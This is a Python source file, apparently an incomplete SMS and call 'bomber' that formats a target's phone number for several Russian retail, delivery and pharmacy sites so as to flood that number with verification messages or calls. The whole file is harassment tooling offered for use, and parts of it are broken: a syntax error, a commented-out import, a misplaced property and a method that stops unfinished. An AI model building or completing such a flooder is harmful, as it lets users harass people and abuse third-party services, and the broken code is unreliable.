import argparse
import time
import requests
import random
import re 

#from Sites import SMS_FLOODS, CALL_FLOODS

class Attack: 
    r = 0 
    START_TIME = None
    SITES = SMS_FLOODS.copy()
    SITES_CALL = CALL_FLOODS.copy() 

    @staticmethod
    def config_phone(_phone):
        _phone9 = _phone[1:]
        _phoneAresBank = '+' + _phone[0] +  '(' + _phone[1:4] + ')' + _phone[4:7] +  '-' + _phone[7:9] + '-' + _phone[9:11]
        _phone9dostavista = _phone9[:3] + '+' + _phone9[3:6] + '-' + _phone9[6:8] + '-' + _phone9[8:10]
        _phoneOstin = '+' + _phone[0] + '(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]
        _phonePizzahut = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + ' ' + _phone[7:9] + '-' + _phone[9:11]
        _phoneGorzdrav = _phone[1:4] + ') ' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]
        _name = ''
        _email = 'test123@gmail.com'
        for _ in range(12):
            _name = _name + random.choice(list('1234567890qwertyuioopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            password = _name + random.choice(list('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPPASDFGHJKLZXCVBNM'))
            username = _name + random.choice(list('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNMM'))

        return{
            '_email': _email,
            '_name': _name, 
            'password': password,
            'username': username,
            '_password': password,
            '_username': username,
            '_phone': _phone,
            '_phone9': _phone9,
            '_pnoneAresBank': _phoneAresBank,
            '_phone9dostavista': _phone9dostavista,
            '_phoneOstin': _phoneOstin,
            '_phonePizzahut': _phonePizzahut,
            '_phoneGorzdrav': _phoneGorzdrav,
        }
    
        @property
        def check_in_time(self):
            if self.time_rangeis None:
                return True
            if time.time() - self.START_TIME < self.time_range:
                return True
            return False
        
    def __init__(self, _phone, _type = 'SMS', time_range=None, timeout=2):
        self.phone = _phone
        self.timeout = timeout
        self.time_range = time_range
        self._type = _type

        if self.START_TIME is None:
            self.START_TIME = time.time()
        
    def config_attack(self):
        if self._type == 'SMS':
            query = self.SITES
        else:
            query = self.SITES_CALL

        if len (query.keys()):
            key = list(query.keys())[0]
            value = query.pop(key)
        
